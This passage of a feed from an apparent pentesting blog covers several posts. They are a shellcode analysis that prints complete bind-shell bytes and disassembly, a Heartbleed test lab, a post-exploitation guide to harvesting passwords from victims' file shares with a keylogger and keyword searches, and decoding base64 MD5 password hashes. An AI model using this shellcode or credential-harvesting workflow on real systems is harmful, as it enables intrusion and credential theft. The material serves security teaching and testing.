	<span style="color:#66d9ef">then</span>
		gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
	<span style="color:#66d9ef">else</span>
		gcc -m32 -fno-stack-protector -z execstack $1.c -o $1
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>What this file will do is check to see if you have passed any argument to the script, if not it assumes that the file you want to compile is called &ldquo;shellcode.c&rdquo; which in this case is true.</p>
<p>Then the script will run GCC with the following options:<br>
<code>-m32</code> tells the compiler we&rsquo;re building this source code for a 32 bit operating system.<br>
<code>-fno-stack-protection</code> will disable the stack protection mechanisms in GCC.<br>
<code>-z execstack</code> will allow our stack to be executable.<br>
<code>shellcode.c</code> is the file with the source code.<br>
<code>-o shellcode</code> is the binary file we want to create with our source code.</p>
<p>Now we need to make this new script executable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">chmod +x compile.sh
</code></pre></div><p>That&rsquo;s it, run the script and you should have a brand new binary that can create bind shells.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./compile.sh
</code></pre></div>
    <img src="https://i.imgur.com/z4O3OcW.png"  class="left"  />


<p>We&rsquo;re not interested in running this binary right now, we&rsquo;re only interested in finding out what it does. So lets take a look inside and see what this shellcode is doing.</p>
<p>To do this, we are going to use a tool called <a href="https://sourceware.org/binutils/docs/binutils/objdump.html">objdump</a>, part of <a href="https://sourceware.org/binutils/docs/binutils/index.html">Gnu Binary Utilities</a>, which will look at our shellcode and show us what it&rsquo;s doing.</p>
<p>To install these tools run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install binutils
</code></pre></div><p>Now that we have objdump installed, lets disassemble our binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D shellcode -M intel
</code></pre></div><p>Wow, that is a lot of assembly code. The part we&rsquo;re interested in is:</p>
<pre><code class="language-objdump" data-lang="objdump">08049700 &lt;code&gt;:
  8049700:	31 db                	xor    ebx,ebx
  8049702:	f7 e3                	mul    ebx
  8049704:	b0 66                	mov    al,0x66
  8049706:	43                   	inc    ebx
  8049707:	52                   	push   edx
  8049708:	53                   	push   ebx
  8049709:	6a 02                	push   0x2
  804970b:	89 e1                	mov    ecx,esp
  804970d:	cd 80                	int    0x80
  804970f:	5b                   	pop    ebx
  8049710:	5e                   	pop    esi
  8049711:	52                   	push   edx
  8049712:	66 68 2b 67          	pushw  0x672b
  8049716:	6a 10                	push   0x10
  8049718:	51                   	push   ecx
  8049719:	50                   	push   eax
  804971a:	b0 66                	mov    al,0x66
  804971c:	89 e1                	mov    ecx,esp
  804971e:	cd 80                	int    0x80
  8049720:	89 51 04             	mov    DWORD PTR [ecx+0x4],edx
  8049723:	b0 66                	mov    al,0x66
  8049725:	b3 04                	mov    bl,0x4
  8049727:	cd 80                	int    0x80
  8049729:	b0 66                	mov    al,0x66
  804972b:	43                   	inc    ebx
  804972c:	cd 80                	int    0x80
  804972e:	59                   	pop    ecx
  804972f:	93                   	xchg   ebx,eax
  8049730:	6a 3f                	push   0x3f
  8049732:	58                   	pop    eax
  8049733:	cd 80                	int    0x80
  8049735:	49                   	dec    ecx
  8049736:	79 f8                	jns    8049730 &lt;code+0x30&gt;
  8049738:	b0 0b                	mov    al,0xb
  804973a:	68 2f 2f 73 68       	push   0x68732f2f
  804973f:	68 2f 62 69 6e       	push   0x6e69622f
  8049744:	89 e3                	mov    ebx,esp
  8049746:	41                   	inc    ecx
  8049747:	cd 80                	int    0x80
  8049749:	00 00                	add    BYTE PTR [eax],al
</code></pre><p>We can see <code>xor</code>, <code>push</code>, <code>pop</code>, <code>inc</code> and some other functions but we still don&rsquo;t really know the steps involved to create our own bind shell.</p>
<p>Lets move onto something that will make this even easier to understand.</p>
<p><a href="http://libemu.carnivore.it/">Libemu</a> is a x86 Shellcode Emulation tool that can make following and understanding shellcode much easier.</p>
<p>Download and install libemu, following this procedure:</p>
<p>Firstly, we&rsquo;re going to need Git. If you don&rsquo;t already have git installed, install it now</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install git
</code></pre></div><p>Once you have git installed, clone the libemu repo into your temp folder</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd /tmp
git clone git://git.carnivore.it/libemu.git
</code></pre></div><p>You&rsquo;ll also need some dependencies to get libemu installed and running</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install build-essential autoconf libtool python-dev graphviz
</code></pre></div><p>Now go into the libemu folder we cloned</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd /tmp/libemu/
</code></pre></div><p>Run these commands to configure and build libemu</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">autoreconf -v -i
./configure --enable-python-bindings --prefix<span style="color:#f92672">=</span>/opt/libemu
sudo make install
sudo ldconfig -n /opt/libemu/lib
</code></pre></div><p>We should now have a libemu folder installed in <code>/opt/libemu/</code></p>
<p>We now need to prepare our shellcode for libemu. Start by grabbing just the shellcode and place it in a file called <code>shellcode.hex</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat shellcode.hex
<span style="color:#ae81ff">\x</span>31<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>f7<span style="color:#ae81ff">\x</span>e3<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>53<span style="color:#ae81ff">\x</span>6a 
<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>e1<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>5b<span style="color:#ae81ff">\x</span>5e<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">68</span> 
<span style="color:#ae81ff">\x</span>2b<span style="color:#ae81ff">\x</span>67<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>e1 
<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>b3<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>cd 
<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>3f 
<span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>79<span style="color:#ae81ff">\x</span>f8<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>2f 
<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>62<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>6e<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>e3 
<span style="color:#ae81ff">\x</span>41<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">80</span>
</code></pre></div><p>Next, we&rsquo;re going to create an alias called <a href="http://www.aldeid.com/wiki/Libemu/sctest">hex2raw</a>.</p>
<p>Add this line to your <code>.bashrc</code> file if you want this to be permanently available:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">alias hex2raw<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tr -d &#39;\\\x&#39; | xxd -r -p&#34;</span>
</code></pre></div><p>Now lets convert our hex code to raw code.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat shellcode.hex | hex2raw &gt; shellcode.raw
</code></pre></div><p>If all went well, you should have a new file called shellcode.raw</p>

    <img src="https://i.imgur.com/92bg4y0.png"  class="left"  />


<p>We now have everything we need to see what this bind shell is doing, lets run libemu on this raw code.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat shellcode.raw | /opt/libemu/bin/sctest -vvv -Ss <span style="color:#ae81ff">99999</span> -G shellcode.dot
</code></pre></div><p>The last step is to convert the shellcode.dot graph into an image so we can view it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dot -Tpng -o shellcode.png shellcode.dot
</code></pre></div><p>Great, we now have a shellcode.png file, lets take a look at it</p>

    <img src="https://i.imgur.com/8hyY41M.png"  class="left"  />


<p>EPIC, now we can see what this shellcode is doing a lot clearer and we can also see the system calls that it is making. We will use these to create our own bind shell shellcode.</p>
<p>We can see that the first call being made is the <code>socket</code> call, followed by the <code>bind</code> call, then the <code>listen</code> and <code>accept</code> calls. Then the code loops through the <code>dup2</code> call several times and finally <code>execve</code> is called.</p>
<p>We finally have our bind shell process:</p>
<ol>
<li>Socket</li>
<li>Bind</li>
<li>Listen</li>
<li>Accept</li>
<li>Dup2</li>
<li>Execve</li>
</ol>
<p>In <a href="/posts/part-2-building-the-shellcode/">Part 2: Building the Shellcode</a>, we will investigate these calls further and start building our own assembly shellcode.</p>
<p>Keep sploiting</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>build a heartbleed test lab in 5 minutes</title>
            <link>https://www.pwnd.red/posts/build-a-heartbleed-test-lab-in-5-minutes/</link>
            <pubDate>Tue, 15 Apr 2014 06:18:30 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/build-a-heartbleed-test-lab-in-5-minutes/</guid>
            <description>Lets be clear, I’m all about the offensive side of information security. I&amp;rsquo;m a pentester and I enjoy popping, rooting, owning and pwning all the things. I am aware that what we do is there to assist and encourage better defensive countermeasures but I just leave that to the experts. My colleague sitting nearby has the more unfortunate &amp;ldquo;defensive&amp;rdquo; job consisting of writing detections for all the evil things I do.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/1WCqASf.png"  class="left"  />


<p>Lets be clear, I’m all about the offensive side of information security. I&rsquo;m a pentester and I enjoy popping, rooting, owning and pwning all the things. I am aware that what we do is there to assist and encourage better defensive countermeasures but I just leave that to the experts. My colleague sitting nearby has the more unfortunate &ldquo;defensive&rdquo; job consisting of writing detections for all the evil things I do.</p>
<p>After eavesdropping on one of his conversations about downloading Apache server and configuring it with vulnerable version on OpenSSL, and since as I was in a good mood, I saved him the hours of pain he was racing towards and helped him build a test environment for the Heartbleed vulnerability.</p>
<p>All he really needed for the IDS signature is the Heartbleed traffic. I figured others out there are having to write protections for this so here is how to build a Heartbleed test environment in 5 minutes or less.</p>
<p>First of all, boot up a couple of test VMs, or just one if you enjoy being aggravated. One we will use as the victim machine and the other one will be the attacker&rsquo;s machine.</p>
<h2 id="victim-machine-configuration">Victim Machine Configuration</h2>
<ol>
<li>
<p>Ensure <a href="http://www.perl.org/">Perl</a> is installed.</p>
</li>
<li>
<p>Grab a copy of <a href="http://www.glitchwrks.com/">glitchwrks</a> Heartbleed Honeypot from:</p>
<p>a. Packet Storm: <a href="http://packetstormsecurity.com/files/126068/hb_honeypot.pl.txt">http://packetstormsecurity.com/files/126068/hb_honeypot.pl.txt</a> (Official)
b. Pastebin: <a href="http://pastebin.com/5zUbJXe7">http://pastebin.com/5zUbJXe7</a> (Mirror)</p>
</li>
<li>
<p>Modify the code if you want to change your port or protocol settings</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#66d9ef">my</span> $sock <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> IO::Socket::INET (
  LocalPort <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;443&#39;</span>, <span style="color:#75715e"># &lt;== Set your port you want to listen on here (1 to 65535)</span>
  Proto <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;tcp&#39;</span>, <span style="color:#75715e"># &lt;== Set your protocol you want to use here (tcp/udp)</span>
  Listen <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>, <span style="color:#75715e"># &lt;== Leave this alone</span>
  Reuse <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>, <span style="color:#75715e"># &lt;== Leave this alone too</span>
);
</code></pre></div></li>
<li>
<p>Ensure that you have sufficient privileges <strong>(root / sudo / administrator required for low port numbers)</strong> to execute the file and run it with the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">perl hb_honeypot.pl
</code></pre></div></li>
</ol>
<h2 id="attacker-machine-configuration">Attacker Machine Configuration</h2>
<ol>
<li>
<p>Ensure <a href="https://www.python.org/">Python</a> is installed.</p>
</li>
<li>
<p>Grab a copy of <a href="http://www.jspenguin.org/about">Jared Staffords</a> Heartbleed PoC from:</p>
<p>a. S3: <a href="http://s3.jspenguin.org/ssltest.py">http://s3.jspenguin.org/ssltest.py</a> (Official)</p>
<p>b. Pastebin: <a href="http://pastebin.com/WmxzjkXJ">http://pastebin.com/WmxzjkXJ</a> (Mirror)</p>
</li>
<li>
<p>Run the PoC with the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python ssltest.py &lt;victim_ip&gt; -p
</code></pre></div></li>
</ol>
<p>The honeypot script will just listen for a connection and reply with garbage until it sees the actual Heartbleed payload, at which point it will respond with a fake, although funny, memory content dump.</p>
<p>A successful connection should look like this.</p>

    <img src="https://i.imgur.com/VPzEyNS.png"  class="left"  />


<p>This method also gives a clean .pcap file too that can be used for creating all sorts of IDS signatures.</p>

    <img src="https://i.imgur.com/P62HkiK.png"  class="left"  />


<p>I hope this post helps some researchers, developers or our defense brethren.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>post exploitation: finding passwords in haystacks</title>
            <link>https://www.pwnd.red/posts/post-exploitation-finding-passwords-in-haystacks/</link>
            <pubDate>Thu, 19 Dec 2013 02:55:06 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/post-exploitation-finding-passwords-in-haystacks/</guid>
            <description>Often while conducting an internal pentest you may gain access to a user machine through some vulnerability or more commonly via social engineering. Let’s say that you pop a shell, unprivileged, and incognito only finds unprivileged domain tokens. You could move onto another target or you can try some post exploitation reconnaissance. A commonly overlooked source of sensitive information is documents that are stored on the company servers as well as staff who think they know enough to start sharing folders with their peers and end up sharing the root of ‘C’.</description>
            <content type="html"><![CDATA[<p>Often while conducting an internal pentest you may gain access to a user machine through some vulnerability or more commonly via social engineering. Let’s say that you pop a shell, unprivileged, and incognito only finds unprivileged domain tokens. You could move onto another target or you can try some post exploitation reconnaissance. A commonly overlooked source of sensitive information is documents that are stored on the company servers as well as staff who think they know enough to start sharing folders with their peers and end up sharing the root of ‘C’. These can be a fantastic source of juicy info if you know how to index and then search through them effectively.</p>
<p>Firstly we need to see what shares your victim has access to. Nmap’s NSE will only get you so far but fortunately Microsoft has their own tool to do this for us, and best of all, it’s signed by Microsoft so using this is seldom an issue.</p>
<p>Grab <a href="http://technet.microsoft.com/en-us/sysinternals/bb897442.aspx">ShareEnum</a> from <a href="http://technet.microsoft.com/en-us/sysinternals">Sysinternals</a>. It’s a self-contained executable that doesn’t require any installation. Wait for the vic to take lunch or head home, connect to his desktop and run the tool. If you don’t have his password yet, use the <a href="http://www.rapid7.com/db/modules/post/windows/capture/lockout_keylogger">Metasploit Lockout Credential Keylogger</a>. If you’re lucky enough, ShareEnum will get you all the shares for the entire domain otherwise just use the local subnets to search for the data stores. Make a note of the mapped drives and take note of the UNC paths; this will come in handy later.</p>

    <img src="/images/post-exploitation-finding-passwords-in-haystacks/shareenum01.png"  class="left"  />


<p>Once you’ve exported the data into a text file, use your text editor to get the share names and begin creating a mount script to mount them. Ensure that you mount them all under the same subfolder, e.g. <code>/mnt</code> or <code>/media</code>, so we can configure the indexer to only index these mounts and not waste time indexing your own drive. Run the script to create all the mount points.</p>

    <img src="/images/post-exploitation-finding-passwords-in-haystacks/mkmounts01.png"  class="left"  />


<p>Once you’ve created a mount point for each of the shares, create a script to mount the shares and run it.</p>

    <img src="/images/post-exploitation-finding-passwords-in-haystacks/mountshares01.png"  class="left"  />


<p>Now that the shares are mounted, the indexing tool needs to be installed and configured. A decent indexing tool that I would recommend is called <a href="http://www.lesbonscomptes.com/recoll/">Recoll</a>. Recoll may already be installed in Kali. The benefit to using Recoll over some alternatives is that it can index the usual text and spreadsheet documents as well as inside ZIP file formats including the newer .DOCX, .XLSX and .PPTX. It also parses MIME, XML and PDF very well.</p>

    <img src="/images/post-exploitation-finding-passwords-in-haystacks/recoll.png"  class="left"  />


<p>Installing recall on Kali or Ubuntu is pretty simple.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install recoll
</code></pre></div><p>Once you have downloaded the tool, you will need to edit the config file which by default is stored at</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">~/.recoll/recoll.conf
</code></pre></div><p>I found these settings to be the best time/finding trade-off.</p>

    <img src="/images/post-exploitation-finding-passwords-in-haystacks/configfile01.png"  class="left"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">topdirs = path where you mounted the shares
idxflushmb = database store size before flush
skippedNames = files &amp; extensions you don’t want indexed (filenames will still be shown, not contents)
indexedmimetypes = the file types that you want indexed
</code></pre></div><p>Once the config file is configured, pipe in the list of files you want indexed. Use a command such as</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">find /mnt –type f –print | recollindex –i
</code></pre></div><p>Once the files have been indexed, open up the Recoll GUI and start searching for keywords that will help get you some additional passwords. A list of keywords that worked well</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">credit card
ctrl alt del
domain\
id
ident
key
log in
log on
login
logon
net use
net user
pass
passphrase
passwd
password
pin
phrase
pw
pword
secret
ssid
un
uname
user
username
wireless
</code></pre></div><p>Here are a couple of screenshots from just a few shares that were available on this local subnet.</p>

    <img src="/images/post-exploitation-finding-passwords-in-haystacks/findings_password01.png"  class="left"  />



    <img src="/images/post-exploitation-finding-passwords-in-haystacks/findings_netuser01.png"  class="left"  />



    <img src="/images/post-exploitation-finding-passwords-in-haystacks/findings_database01.png"  class="left"  />


<p>The keyword list is by no means comprehensive, however it should provide a solid foundation for a way of thinking about sensitive documents that are shared with everyone. As pentesters, we can use this information to increase our reach and impact on the client network. Knowing items such as the local administrator passwords and using them with <code>PSEXEC</code> can compromise the majority of machines on the network and the chances of now finding a domain administrator token on one of those boxes is going to increase.</p>
<p>Even the best training and policies are not going to stop certain system administrators from reusing passwords, so knowing some of these passwords can usually yield some interesting findings. Another high risk finding is the database credentials, which almost never get changed and often allow system commands to be executed.</p>
<p>Knowing how to find the sensitive information is a great skill to have in your arsenal and I hope this short post inspires you to become a better tester. The days of vulnerability scanners getting you root or system are numbered and exploiting the human weaknesses is becoming a necessity in modern networks.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>using perl to grab ip addresses of multiple hostnames</title>
            <link>https://www.pwnd.red/posts/using-perl-to-grab-ip-addresses-of-multiple-hostnames/</link>
            <pubDate>Sun, 10 Mar 2013 00:13:31 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/using-perl-to-grab-ip-addresses-of-multiple-hostnames/</guid>
            <description>Recently while conducting a vulnerability assessment for a rather large customer I was given a list of hostnames from around 20 domains culminating in a list of over 5000 targets that needed to go through the motions. Due to scale of the testing I needed to run the scans from several cloud nodes simultaneously to speed up the scanning. The other thing I needed to do was to extract all the IP addresses from the hostnames so as not to scan boxes multiple times when performing Port Scans for instance.</description>
            <content type="html"><![CDATA[<p>Recently while conducting a vulnerability assessment for a rather large customer I was given a list of hostnames from around 20 domains culminating in a list of over 5000 targets that needed to go through the motions. Due to scale of the testing I needed to run the scans from several cloud nodes simultaneously to speed up the scanning. The other thing I needed to do was to extract all the IP addresses from the hostnames so as not to scan boxes multiple times when performing Port Scans for instance.</p>
<p>I had been playing with Perl for literally a couple of hours and decided to give writing my first Perl script a go in order to grab all the IP addresses from the list of hosts which I could then Unique and Sort to get the final list of target IP&rsquo;s. I initially played with the idea of running ping commands or nslookups and then regex&rsquo;ing the IP&rsquo;s from there but I discovered a fantastic method called <code>gethostbyname</code> in Perl.</p>
<p>After some trial and error I ended up with this little gem that literally shaved days off this vulnerability assessment (5000+ hostnames ended up being less than 1000 IP addresses).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/perl</span>

<span style="color:#66d9ef">use</span> Socket;

<span style="color:#75715e"># Print usage when no hosts file is specified</span>
<span style="color:#66d9ef">if</span> ($ARGV[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">eq</span> <span style="color:#e6db74">&#39;&#39;</span>) {
  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;n Usage: &#34;</span><span style="color:#f92672">.</span>$0<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &amp;lt;hosts_file&amp;gt;nn&#34;</span>;
  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34; e.g: &#34;</span><span style="color:#f92672">.</span>$0<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; hosts.txtnn&#34;</span>;
}

<span style="color:#75715e"># Open file containing list of Hostnames</span>
open(FILE, $ARGV[<span style="color:#ae81ff">0</span>]);
@hosts <span style="color:#f92672">=</span> ;
close(FILE);

<span style="color:#75715e"># For each hostname, fetch the IP address</span>
<span style="color:#66d9ef">foreach</span> $hostname (@hosts) {
   chomp($hostname);
   <span style="color:#66d9ef">if</span>($hostname) {
      $ip <span style="color:#f92672">=</span> gethostbyname($hostname);
      <span style="color:#66d9ef">if</span>($ip) {
        printf <span style="color:#e6db74">&#34;%sn&#34;</span> , $hostname<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;:&#34;</span><span style="color:#f92672">.</span>inet_ntoa($ip);
        undef $ip;
      } <span style="color:#66d9ef">else</span> {
      	<span style="color:#75715e"># Print 0.0.0.0 for unresolved Hostnames</span>
        printf <span style="color:#e6db74">&#34;%sn&#34;</span> , $hostname<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;:0.0.0.0&#34;</span>;
        undef $ip;
      }
   }
}
</code></pre></div><p>It works by taking each hostname and running the <code>gethostbyname</code> method on it to print out the original hostname and IP address separated by a <code>:</code> for easy regex or to use delimited import in Excel. Feel free to change the delimiter if you so wish. The other function I added was to set an IP address of <code>0.0.0.0</code> whenever a hostname could not be resolved.</p>
<p>Here&rsquo;s what it looks like in action.</p>

    <img src="https://i.imgur.com/6CAapmm.png"  class="left"  />


<p>If you want to import the output into another program you can just append &quot; <strong>&gt; output.csv</strong>&quot;</p>
<p>Hope you found this useful.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
<p>References:</p>
<ul>
<li><a href="http://www.tutorialspoint.com/perl/perl_gethostbyname.htm">http://www.tutorialspoint.com/perl/perl_gethostbyname.htm</a></li>
<li><a href="http://www.tutorialspoint.com/perl/perl_printf.htm">http://www.tutorialspoint.com/perl/perl_printf.htm</a></li>
<li><a href="http://www.cs.cmu.edu/afs/cs/usr/rgs/mosaic/pl-predef.html">http://www.cs.cmu.edu/afs/cs/usr/rgs/mosaic/pl-predef.html</a></li>
<li><a href="http://perldoc.perl.org/Socket.html#%24string-%3d-inet_ntoa-%24ip_address">http://perldoc.perl.org/Socket.html#%24string-%3d-inet_ntoa-%24ip_address</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>decrypting base64 encrypted binary hashes</title>
            <link>https://www.pwnd.red/posts/decrypting-base64-encrypted-binary-hashes/</link>
            <pubDate>Wed, 07 Nov 2012 09:18:43 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/decrypting-base64-encrypted-binary-hashes/</guid>
            <description>I came across a database while testing the other day which happily contained a table called users with the good old id, username and password fields. What made this a somewhat interesting find was the fact that the passwords appeared to be encrypted as base64.
After I stopped giggling I dumped the database and grabbed the first few hashes in an attempt to quickly script the decryption. The script ran fine although I ended up with a lot of garbled text and no plain text passwords.</description>
            <content type="html"><![CDATA[<p>I came across a database while testing the other day which happily contained a table called users with the good old id, username and password fields. What made this a somewhat interesting find was the fact that the passwords appeared to be encrypted as base64.</p>

    <img src="https://i.imgur.com/5qRhe.png"  class="left"  />


<p>After I stopped giggling I dumped the database and grabbed the first few hashes in an attempt to quickly script the decryption. The script ran fine although I ended up with a lot of garbled text and no plain text passwords. I decided to try decrypt these passwords using several online websites when I discovered that they were actually binary files that had be encoded with base64. I began to doubt my sanity and asked myself why anyone would have passwords stored as binary files. I mean, the log in page didn&rsquo;t have a field for username and an upload box for password so what was going on?</p>

    <img src="https://i.imgur.com/xeK2H.png"  class="left"  />


<p>I noticed that several of the hashes were the same and I figured that whatever was going on it was going to have something to do with these recurring ones. A google search later ended up with me on a forum reading the default password storage procedure for Ahsay Backup was to encrypt the passwords using the following process:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo -n password | openssl dgst -md5 -binary | base64
</code></pre></div><p>This was great as I now knew what they were doing to store the passwords and I could start to piece together how to reverse them.</p>
<p>I started by looking what a MD5 in binary looked like and figured I work my way back from there.</p>

    <img src="https://i.imgur.com/sjnut.png"  class="left"  />


<p>I could see that the binary text contained the text of the hash but it was jumbled around due to the binary (little endian?) architecture. My mind started working out some way to reassemble the hashes using some lame string functions but the answer that I ended up with was way more simple.</p>
<p>XXD!</p>
<p>XX-What was my original thought but xxd is a magical little tool that outputs the results of binary in plain text for you.</p>
<p>After a quick peek at <code>-help</code> I found the following command perfect for getting back to MD5 hashes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo X03MO1qnZdYdgyfeuILPmQ<span style="color:#f92672">==</span> | base64 -d | xxd -p
</code></pre></div><p>This worked perfectly and I was on my way to decrypting these boys in no time.</p>

    <img src="https://i.imgur.com/6t3Ct.png"  class="left"  />


<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>apache log poisoning with local file inclusion</title>
            <link>https://www.pwnd.red/posts/apache-log-poisoning-with-local-file-inclusion/</link>
            <pubDate>Sun, 04 Nov 2012 04:08:58 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/apache-log-poisoning-with-local-file-inclusion/</guid>
            <description>So we have our Local File Inclusion vulnerability and we can read the /etc/passwd file, now it&amp;rsquo;s time to start escalating the attack so that we are able to execute our own commands on the target system.
In the previous post, we found the Apache log files and particularly the Apache error.log file using Burp Suite&amp;rsquo;s Intruder module. We are now going to use this log file to inject our own PHP code into this page.</description>
